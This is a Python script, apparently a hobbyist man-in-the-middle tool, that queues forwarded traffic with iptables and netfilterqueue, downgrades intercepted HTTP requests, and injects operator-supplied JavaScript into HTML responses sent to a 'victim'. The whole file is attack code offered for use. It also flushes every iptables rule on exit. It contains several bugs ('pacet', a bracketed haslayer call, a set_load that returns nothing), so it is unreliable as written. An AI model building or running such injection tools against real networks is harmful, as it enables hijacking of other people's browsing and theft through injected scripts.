#!/usr/bin/env python
# -*- coding: utf-8 -*-

import scapy.all as scapy
import netfilterqueue
from colorama import Fore
import sys, os
import re

iptables = os.system('iptables -I FORWARD -j NFQUEUE --queue-num 0')



def set_load(packet, load):
     packet[scapy.Raw].load = load
     del packet[scapy.IP].len
     del packet[scapy.IP].chksum
     del packet[scapy.TCP].chksum
     
def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer[scapy.Raw]:
          load = scapy_packet[scapy.Raw].load
          if scapy_packet[scapy.TCP].dport == 10000:
               load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
               load = load.replace("HTTP/1.1", "HTTP/1.0")
          elif scapy_packet[scapy.TCP].sport == 10000:
               injection_code = str(code)
               print("[+] Injecting code.")
               load = load.replace("</body>", +injection_code +"</body>")
               content_len_search = re.search("(?:Content-Length:\s)(\d*)", load)
               if content_len_search and "text/html" in load:
                    print("[+] Recalculating Content Length")
                    content_len = content_len_search.group(1)
                    new_content_len = int(content_len) + len(injection_code)
                    load = load.replace(content_len, str(new_content_len))
                         
          if load != scapy_packet[scapy.Raw].load:
               print("[+] Setting Payload Done.")
               new_packet = set_load(scapy_packet, load)
               pacet.set_payload(str(new_packet))
               print("[+] Code Injected")
                    
     packet.accept()
     
def nfqueue():
     try:
          queue = netfilterqueue.NetfilterQueue()
          iptables
          queue.bind(0, process_packet)
          print("[+] Running")
          print("[*] waiting for victim")
          return queue.run()
     except KeyboardInterrupt:
          print("[+] Resetting IPTables")
          os.system('iptables --flush')
          print("[*] Quit")
print("")     
print("[+] EX. <script>alert('Test');</script>")
print("")     
code = raw_input(Fore.GREEN+"Enter Code To Inject >> "+Fore.WHITE)
          
nfqueue()
